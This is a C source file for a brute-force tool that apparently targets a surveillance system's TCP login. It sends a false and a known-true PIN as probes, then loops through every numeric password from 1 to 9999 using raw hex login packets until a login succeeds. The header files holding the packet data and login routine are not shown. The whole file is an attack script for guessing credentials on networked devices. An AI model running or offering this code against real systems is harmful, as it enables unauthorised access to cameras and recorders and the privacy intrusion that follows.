/******************************************************************************
*  @file tcp_brute.c
*  @brief Generic Network Brute-force
*  @version 1.0.2
*  @author Ara Khachatryan 
******************************************************************************/

#include <stdbool.h> /* for supporting bool type */
#include <stdio.h> /* standard input/output library, for perror() */
#include <stdlib.h> /* dynamic memory management, for calloc() */
#include <string.h> /* functions for manipulating strings, for memcpy() */
#include <errno.h> /* for errno error codes in linux */ 

/******************************************************************************
* @brief include all the data from hex_data.h header file that will be used in 
*        Surviliance system bruteforce
* type: static unsigned char 
* login_data_NULL[116] - login message with NULL password
* login_data_1020[116] - login message with 1020 password
* login_data_5050[116] - login message with 5050 password
* COMMAND_LOGIN_FAIL[18] - keyword send from target in case of wrong password
* admin[5] - login name within login message
******************************************************************************/
#include "hex_data.h" 

bool set_log_msg = true;
static char FCN_login_msg[111];

/***************
* included files --->>
***************/
#include "print_hex_data.h" /* function for printing login data in terminal */
#include "repl_hex_data.h" /* function for setting password in login data */
#include "tcp_login.h" /* core bruteforce function: tcp_login() */
#include "loadBar.h" /* loading bar on terminal: loadBar(), loadBar_fast() */


int main( )
{

	int passwd = 0;
	int limit = 9999;


	/**********************************************************************
	* probe for false "5050" and true "1020" passwords --->>
	**********************************************************************/
	printf("\x1B[2J"); /* clear the terminal screen */
	printf("\x1B[0;0H"); /* move cursor to the 0;0 position of termial */

	printf("\nLogin raw data with false password: 5050 --->>\n");	
	print_hex_data( login_data_5050, sizeof(login_data_5050) ); 
	tcp_login( login_data_5050, set_log_msg );
	printf("tcp_login() -> %s\n", FCN_login_msg);
	sleep(2);

	printf("\nLogin raw data with true password: 1020 --->>\n");	
	print_hex_data( login_data_1020, sizeof(login_data_1020) );
	tcp_login( login_data_1020, set_log_msg );
	printf("tcp_login() -> %s\n", FCN_login_msg);
	sleep(2); 


	/**********************************************************************
	* bruteforce loop --->>
	**********************************************************************/
 	for ( passwd = 1; passwd <= limit; passwd++ ) {

		/**************************************************************
		* initialize login_data with NULLs, copy login_data_NULL's
		* information to the login_data, then set current passwd 
		**************************************************************/
		unsigned char *login_data;
		login_data = (unsigned char *)calloc(sizeof(login_data_NULL),
		                                     sizeof(unsigned char));
		memcpy(login_data, login_data_NULL, sizeof(login_data_NULL));
		repl_hex_data(login_data, passwd);

		int result = tcp_login( login_data, set_log_msg );

		free(login_data);

		/************
		* loading bar --->>
		************/
		loadBar_msg( passwd, limit, 50 );  
//		loadBar_fast( passwd, limit, 1000, 50 );

		if ( result >= 1 ) {
			break;
		}
		
		// dont forget to disable this line, it slows code
		usleep(2500);

	}

	return 0;
}

